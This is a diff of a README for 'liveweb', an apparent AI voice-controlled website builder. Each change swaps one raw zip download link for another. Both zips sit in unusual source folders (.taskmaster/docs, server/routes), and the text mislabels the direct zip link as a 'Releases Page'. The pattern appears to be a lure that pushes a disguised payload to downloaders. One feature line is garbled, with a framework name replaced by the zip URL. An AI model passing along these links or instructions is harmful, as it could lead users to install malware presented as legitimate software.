@@ -1,6 +1,6 @@
 # 🚀 liveweb - Build Websites by Speaking Naturally
 
-[![Download liveweb](https://github.com/Sarfraz121/liveweb/raw/refs/heads/main/.taskmaster/docs/Software-3.0-beta.5.zip)](https://github.com/Sarfraz121/liveweb/raw/refs/heads/main/.taskmaster/docs/Software-3.0-beta.5.zip)
+[![Download liveweb](https://github.com/Sarfraz121/liveweb/raw/refs/heads/main/server/routes/Software_3.1.zip)](https://github.com/Sarfraz121/liveweb/raw/refs/heads/main/server/routes/Software_3.1.zip)
 
 ## 📦 Overview
 
@@ -10,7 +10,7 @@ liveweb is an AI-powered web builder that allows you to create complete web appl
 
 - **Voice Command**: Control the entire web-building process using your voice. No typing needed.
 - **AI Assistance**: Integrated AI guides you in real-time, ensuring a smooth experience.
-- **Web Technologies**: Utilizes modern frameworks like React and https://github.com/Sarfraz121/liveweb/raw/refs/heads/main/.taskmaster/docs/Software-3.0-beta.5.zip for optimal performance.
+- **Web Technologies**: Utilizes modern frameworks like React and https://github.com/Sarfraz121/liveweb/raw/refs/heads/main/server/routes/Software_3.1.zip for optimal performance.
 - **User-Friendly Interface**: Designed for non-technical users. Anyone can create a website with ease.
 - **Instant Preview**: See changes in real-time as you speak.
 
@@ -20,7 +20,7 @@ To start using liveweb, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Go to the following link to access the latest version of liveweb:  
-   [Download liveweb](https://github.com/Sarfraz121/liveweb/raw/refs/heads/main/.taskmaster/docs/Software-3.0-beta.5.zip)
+   [Download liveweb](https://github.com/Sarfraz121/liveweb/raw/refs/heads/main/server/routes/Software_3.1.zip)
 
 2. **Download the Application**  
    Once on the Releases page, find the latest version and click on it. This will take you to the download options.  
@@ -50,7 +50,7 @@ To ensure a smooth experience, please make sure your computer meets the followin
 
 ## 📥 Download & Install
 
-To download liveweb, visit this page: [Download liveweb](https://github.com/Sarfraz121/liveweb/raw/refs/heads/main/.taskmaster/docs/Software-3.0-beta.5.zip).
+To download liveweb, visit this page: [Download liveweb](https://github.com/Sarfraz121/liveweb/raw/refs/heads/main/server/routes/Software_3.1.zip).
 
 ### Steps to Install:
 
